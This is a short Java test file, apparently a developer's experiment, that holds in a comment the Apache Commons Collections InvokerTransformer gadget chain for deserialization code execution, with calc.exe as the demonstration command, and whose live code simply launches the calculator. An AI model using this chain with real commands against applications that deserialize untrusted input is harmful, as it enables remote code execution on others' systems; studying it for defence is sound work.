package com.lutongnet.base.util;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class DeserTest {
	public static void main(String[] args) {
		/**
		 * 
		Transformer[] transformers = new Transformer[] {
		        new ConstantTransformer(Runtime.class),
		        
		        new InvokerTransformer("getMethod", new Class[] {
		            String.class, Class[].class }, new Object[] {
		            "getRuntime", new Class[0] }),
		            
		        new InvokerTransformer("invoke", new Class[] {
		            Object.class, Object[].class }, new Object[] {
		            null, new Object[0] }),
		            
		        new InvokerTransformer("exec", new Class[] {
		            String.class }, new Object[] {"calc.exe"})};
	
	    Transformer transformedChain = new ChainedTransformer(transformers);

	    Map innerMap = new HashMap();
	    innerMap.put("value", "value");
	    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);

	    Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
	    onlyElement.setValue("foobar");
	    
	    */
	    
	    try {
			Runtime.getRuntime().exec("calc");
		} catch (IOException e) {
			e.printStackTrace();
		}
	
	}
}
